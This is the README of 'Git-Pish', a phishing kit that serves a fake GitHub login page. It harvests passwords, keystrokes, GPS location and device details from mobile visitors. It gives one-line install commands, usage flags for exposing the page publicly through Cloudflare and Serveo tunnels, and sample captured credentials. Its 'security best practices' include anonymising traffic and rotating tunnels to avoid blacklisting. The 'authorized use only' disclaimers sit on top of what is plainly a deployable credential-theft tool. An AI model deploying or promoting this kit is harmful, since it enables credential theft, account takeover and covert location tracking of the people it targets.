<p align="center">
  <a href="https://ibb.co/chbDY51r">
    <img src="https://i.ibb.co/v4sZX5Hj/Untitled-design-13.jpg" alt="Git-Pish Logo" border="0" width="650">
  </a>
</p>

<h1 align="center">GIT-PISH</h1>
<h3 align="center">Advanced Mobile Penetration Testing Framework</h3>

<p align="center">
  <img src="https://img.shields.io/badge/Author-xspeen-red?style=flat-square&logo=github">
  <img src="https://img.shields.io/badge/Version-1.0.0-blue?style=flat-square&logo=git">
  <img src="https://img.shields.io/badge/Classification-Red%20Team-black?style=flat-square&logo=atom">
  <img src="https://img.shields.io/badge/License-Educational%20Use%20Only-yellow?style=flat-square&logo=bookstack">
</p>

<p align="center">
  <i>Authorized credential harvesting and device fingerprinting for mobile security assessments</i>
</p>

---

## SUPPORTED OPERATING SYSTEMS

<p align="center">
  <img src="https://img.shields.io/badge/Ubuntu-E95420?style=for-the-badge&logo=ubuntu&logoColor=white">
  <img src="https://img.shields.io/badge/Debian-D70A53?style=for-the-badge&logo=debian&logoColor=white">
  <img src="https://img.shields.io/badge/Kali_Linux-557C94?style=for-the-badge&logo=kalilinux&logoColor=white">
  <img src="https://img.shields.io/badge/Parrot_OS-15E0B3?style=for-the-badge&logo=parrot&logoColor=white">
  <img src="https://img.shields.io/badge/Termux-000000?style=for-the-badge&logo=terminal&logoColor=white">
  <img src="https://img.shields.io/badge/macOS-000000?style=for-the-badge&logo=apple&logoColor=white">
  <img src="https://img.shields.io/badge/Android-3DDC84?style=for-the-badge&logo=android&logoColor=white">
</p>

---

## SECURITY CLASSIFICATION BADGES

<p align="center">
  <img src="https://img.shields.io/badge/Penetration_Testing-Red_Team-red?style=for-the-badge">
  <img src="https://img.shields.io/badge/Ethical_Hacking-Legal-green?style=for-the-badge">
  <img src="https://img.shields.io/badge/Authorized_Use_Only-FF0000?style=for-the-badge">
  <img src="https://img.shields.io/badge/Educational_Purposes-0055FF?style=for-the-badge">
</p>

---

## VERSION AND STATUS

<p align="center">
  <img src="https://img.shields.io/badge/Version-1.0.0-blue?style=for-the-badge">
  <img src="https://img.shields.io/badge/Status-Stable-brightgreen?style=for-the-badge">
  <img src="https://img.shields.io/badge/Last_Update-2025-blue?style=for-the-badge">
  <img src="https://img.shields.io/badge/Code_Quality-A%2B-success?style=for-the-badge">
</p>

---

## TECHNOLOGY STACK

<p align="center">
  <img src="https://img.shields.io/badge/Python-3776AB?style=for-the-badge&logo=python&logoColor=white">
  <img src="https://img.shields.io/badge/Linux-FCC624?style=for-the-badge&logo=linux&logoColor=black">
  <img src="https://img.shields.io/badge/GitHub-181717?style=for-the-badge&logo=github&logoColor=white">
  <img src="https://img.shields.io/badge/SQLite-003B57?style=for-the-badge&logo=sqlite&logoColor=white">
  <img src="https://img.shields.io/badge/Cloudflare-F38020?style=for-the-badge&logo=cloudflare&logoColor=white">
  <img src="https://img.shields.io/badge/SSH-000000?style=for-the-badge&logo=openssh&logoColor=white">
</p>

---

## TABLE OF CONTENTS

1. [Quick Installation](#quick-installation)
2. [OS Specific Details](#os-specific-details)
3. [Legal Disclaimer](#legal-disclaimer)
4. [Features](#features)
5. [Usage Commands](#usage-commands)
6. [Tunneling Options](#tunneling-options)
7. [Data Captured](#data-captured)
8. [Project Structure](#project-structure)
9. [Output Examples](#output-examples)
10. [Requirements](#requirements)
11. [Troubleshooting](#troubleshooting)
12. [Security Best Practices](#security-best-practices)

---

## QUICK INSTALLATION

| Operating System | One Line Installation Command |
|-----------------|-------------------------------|
| Ubuntu 18.04 - 24.04 | `sudo apt update && sudo apt install git python3 python3-pip -y && git clone https://github.com/xspeen/Git-Pish.git && cd Git-Pish && pip3 install -r requirements.txt && python3 git-pish.py` |
| Debian 10 - 12 | `sudo apt update && sudo apt install git python3 python3-pip -y && git clone https://github.com/xspeen/Git-Pish.git && cd Git-Pish && pip3 install -r requirements.txt && python3 git-pish.py` |
| Kali Linux 2023+ | `sudo apt update && sudo apt install git python3 python3-pip -y && git clone https://github.com/xspeen/Git-Pish.git && cd Git-Pish && pip3 install -r requirements.txt && python3 git-pish.py` |
| Parrot OS 5.0+ | `sudo apt update && sudo apt install git python3 python3-pip -y && git clone https://github.com/xspeen/Git-Pish.git && cd Git-Pish && pip3 install -r requirements.txt && python3 git-pish.py` |
| Termux (Android) | `pkg update && pkg upgrade -y && pkg install git python python-pip openssh -y && git clone https://github.com/xspeen/Git-Pish.git && cd Git-Pish && pip install -r requirements.txt && python3 git-pish.py` |
| Termux (Full Storage) | `termux-setup-storage && pkg update && pkg upgrade -y && pkg install git python python-pip openssh -y && git clone https://github.com/xspeen/Git-Pish.git && cd Git-Pish && pip install -r requirements.txt && python3 git-pish.py` |
| macOS 11+ | `brew install git python3 && git clone https://github.com/xspeen/Git-Pish.git && cd Git-Pish && pip3 install -r requirements.txt && python3 git-pish.py` |

---

## OS SPECIFIC DETAILS

### <img src="https://img.shields.io/badge/Ubuntu-E95420?style=flat-square&logo=ubuntu&logoColor=white" width="80"> Ubuntu

| Attribute | Details |
|-----------|---------|
| Tested Versions | 18.04, 20.04, 22.04, 24.04 |
| Architecture | amd64, arm64 |
| Dependencies | python3, python3-pip, git, openssh-client |
| Tunnel Support | Cloudflare, SSH, Localhost |

### <img src="https://img.shields.io/badge/Debian-D70A53?style=flat-square&logo=debian&logoColor=white" width="80"> Debian

| Attribute | Details |
|-----------|---------|
| Tested Versions | 10 (Buster), 11 (Bullseye), 12 (Bookworm) |
| Architecture | amd64, arm64 |
| Dependencies | python3, python3-pip, git, openssh-client |
| Tunnel Support | Cloudflare, SSH, Localhost |

### <img src="https://img.shields.io/badge/Kali_Linux-557C94?style=flat-square&logo=kalilinux&logoColor=white" width="100"> Kali Linux

| Attribute | Details |
|-----------|---------|
| Tested Versions | 2023.1, 2023.4, 2024.1 |
| Architecture | amd64, arm64 |
| Dependencies | python3, python3-pip, git (preinstalled) |
| Tunnel Support | Cloudflare, SSH, Localhost |

### <img src="https://img.shields.io/badge/Parrot_OS-15E0B3?style=flat-square&logo=parrot&logoColor=white" width="90"> Parrot OS

| Attribute | Details |
|-----------|---------|
| Tested Versions | 5.0, 5.1, 5.2, 5.3, 6.0 |
| Architecture | amd64 |
| Dependencies | python3, python3-pip, git (preinstalled) |
| Tunnel Support | Cloudflare, SSH, Localhost |

### <img src="https://img.shields.io/badge/Termux-000000?style=flat-square&logo=terminal&logoColor=white" width="80"> Termux (Android)

| Attribute | Details |
|-----------|---------|
| Tested Versions | F-Droid latest, Google Play latest |
| Architecture | arm64, aarch64, armv7a |
| Dependencies | python, python-pip, git, openssh, termux-api |
| Tunnel Support | Cloudflare, SSH, Localhost |
| Special Notes | Requires storage permission for full functionality |

### <img src="https://img.shields.io/badge/macOS-000000?style=flat-square&logo=apple&logoColor=white" width="80"> macOS

| Attribute | Details |
|-----------|---------|
| Tested Versions | 11 (Big Sur), 12 (Monterey), 13 (Ventura), 14 (Sonoma) |
| Architecture | amd64, arm64 (M1/M2/M3) |
| Dependencies | python3, git, openssh (brew) |
| Tunnel Support | Cloudflare, SSH, Localhost |

---

## SUMMARY TABLE

| Category | Status |
|----------|--------|
| Platform | Linux / Termux / Android / macOS |
| Language | Python 3.8+ |
| Category | Mobile Pentesting / Credential Harvesting |
| Compatibility | Ubuntu / Debian / Parrot OS / Kali / Termux |
| Architecture | amd64 / arm64 / aarch64 |
| License | Educational Use Only |
| Testing Type | Authorized Penetration Testing |

---

## LEGAL DISCLAIMER

> **WARNING:** This tool is designed for authorized penetration testing and security research only. Unauthorized access to computer systems is illegal under the Computer Fraud and Abuse Act (CFAA) and similar laws worldwide.

**By using this tool, you agree:**

1. You have explicit written permission to test the target systems
2. You will not use this tool for any illegal activities
3. You assume all responsibility for your actions
4. The author assumes no liability for misuse or damage

---

## FEATURES

| Category | Features |
|----------|----------|
| Credential Harvesting | GitHub realistic clone page with form capture |
| Device Fingerprinting | OS, browser, screen resolution, battery level, touch points |
| GPS Tracking | Latitude, longitude, accuracy with Google Maps integration |
| Keystroke Logging | Real-time character capture with timestamps |
| Network Intelligence | Local IP, public IP, connection type, RTT, downlink speed |
| WebRTC Exploitation | Local IP address leakage detection |
| Tunneling | Cloudflare automatic, SSH Serveo, Localhost, LAN |
| Data Storage | SQLite database, JSON, plain text logs |
| Reporting | HTML reports, JSON exports, structured data |
| CLI Dashboard | Interactive console for log viewing and management |

---

## USAGE COMMANDS

| Command | Description |
|---------|-------------|
| `python3 git-pish.py` | Start server on default port 8080 |
| `python3 git-pish.py --port 5555` | Start server on custom port 5555 |
| `python3 git-pish.py --tunnel cloudflare` | Start with Cloudflare public URL |
| `python3 git-pish.py --tunnel ssh` | Start with SSH tunnel (Serveo) |
| `python3 git-pish.py --silent` | Silent mode with no console output |
| `python3 git-pish-cli.py` | Launch interactive CLI dashboard |
| `python3 git-pish.py --help` | Show all available options |

---

## TUNNELING OPTIONS

| Method | Command Flag | Public URL Format | Required Dependency |
|--------|--------------|-------------------|---------------------|
| Cloudflare | `--tunnel cloudflare` | `https://xxxx.trycloudflare.com` | cloudflared |
| SSH Serveo | `--tunnel ssh` | `https://xxxx.serveo.net` | SSH client |
| Localhost | Default | `http://localhost:8080` | None |
| LAN | Auto-detect | `http://192.168.x.x:8080` | None |

---

## DATA CAPTURED

| Data Type | File Location | Format |
|-----------|---------------|--------|
| Credentials | `logs/credentials.log` | `username:password` |
| Credentials JSON | `logs/credentials.json` | Structured JSON |
| Device Fingerprint | `logs/devices.json` | Full device specifications |
| GPS Locations | `logs/locations.txt` | Latitude, Longitude |
| GPS Locations JSON | `logs/locations.json` | Structured with accuracy |
| Keystrokes | `logs/keystrokes.log` | Timestamped keystrokes |
| Network Profiles | `logs/network_profiles.json` | IP, connection type, RTT |
| SQLite Database | `logs/sessions.db` | Relational data |

---

## PROJECT STRUCTURE

```

Git-Pish/
│
├── git-pish.py              # Main framework entry point
├── git-pish-cli.py          # Interactive CLI dashboard
├── install.sh               # One-command installer
├── requirements.txt         # Python dependencies
├── README.md                # Complete documentation
├── .gitignore               # Exclude logs and cache
│
├── modules/
│   ├── init.py          # Module initializer
│   ├── capture_engine.py    # Data harvesting core
│   ├── tunnel_manager.py    # Tunnel handling
│   └── logger.py            # Logging system
│
├── assets/
│   └── github_login.html    # GitHub phishing clone page
│
└── logs/                    # Captured data (auto-created)

```

---

## OUTPUT EXAMPLES

### Credentials Capture

```

Time: 2024-01-15 14:30:22
IP: 192.168.1.100
Username: johndoe
Password: SecurePass123

```

### GPS Location Capture

```

Time: 2024-01-15 14:30:25
IP: 192.168.1.100
Latitude: 40.7128
Longitude: -74.0060
Accuracy: 15 meters
Google Maps: https://www.google.com/maps?q=40.7128,-74.0060

```

### Device Fingerprint

```

IP: 192.168.1.100
User Agent: Mozilla/5.0 (Linux; Android 13) AppleWebKit/537.36
Platform: Linux armv8l
Screen: 1080x2400
Timezone: America/New_York
Battery: 85% (Charging)
Hardware Concurrency: 8
Device Memory: 4 GB
Max Touch Points: 10

```

---

## REQUIREMENTS

| Dependency | Version | Ubuntu/Debian | Termux | macOS |
|------------|---------|---------------|--------|-------|
| Python | 3.8+ | python3 | python | python3 |
| pip | Latest | python3-pip | python-pip | pip3 |
| git | Latest | git | git | git |
| openssh | Latest | openssh-client | openssh | openssh |
| requests | 2.25+ | pip3 install | pip install | pip3 install |
| colorama | 0.4+ | pip3 install | pip install | pip3 install |
| termcolor | 1.1+ | pip3 install | pip install | pip3 install |
| cloudflared | Latest | apt install | pkg install | brew install |

---

## TROUBLESHOOTING

| Issue | Ubuntu/Debian/Kali/Parrot | Termux | macOS |
|-------|---------------------------|--------|-------|
| cloudflared not found | `sudo apt install cloudflared` | `pkg install cloudflared` | `brew install cloudflared` |
| Port already in use | `sudo kill $(lsof -t -i:8080)` | `kill $(lsof -t -i:8080)` | `lsof -ti:8080 | xargs kill` |
| Permission denied | `chmod +x *.py` | `chmod +x *.py` | `chmod +x *.py` |
| Python not found | `sudo apt install python3` | `pkg install python` | `brew install python3` |
| pip not found | `sudo apt install python3-pip` | `pkg install python-pip` | `python3 -m ensurepip` |
| Storage error | Not applicable | `termux-setup-storage` | Not applicable |
| Module not found | `pip3 install -r requirements.txt` | `pip install -r requirements.txt` | `pip3 install -r requirements.txt` |
| SSH tunnel fails | `ssh -R 80:localhost:8080 serveo.net` | `ssh -R 80:localhost:8080 serveo.net` | `ssh -R 80:localhost:8080 serveo.net` |

---

## SECURITY BEST PRACTICES

1. Always obtain written authorization before testing
2. Use VPN to anonymize your traffic
3. Rotate tunneling services to avoid domain blacklisting
4. Clear logs after testing completion
5. Use separate isolated environment for testing
6. Never share captured credentials publicly
7. Follow responsible disclosure practices
8. Delete all captured data after authorized testing period

---

## DISCLAIMER

THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY, FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM, OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE SOFTWARE.

---

## CONTACT

| Platform | Link |
|----------|------|
| GitHub | [https://github.com/xspeen](https://github.com/xspeen) |
| Report Issues | [https://github.com/xspeen/Git-Pish/issues](https://github.com/xspeen/Git-Pish/issues) |
| Security Research | Authorized testing only |

---

## VERSION HISTORY

| Version | Date | Changes |
|---------|------|---------|
| 1.0.0 | 2024 | Initial release with full framework |

---

## ACKNOWLEDGMENTS

- Cloudflare for cloudflared tunneling
- Serveo.net for SSH tunneling service
- Open source community for dependencies
- Termux team for Android terminal emulator

---

## FINAL NOTES

This tool is actively maintained for educational and authorized security testing purposes. Pull requests and issues are welcome from verified security researchers.
```
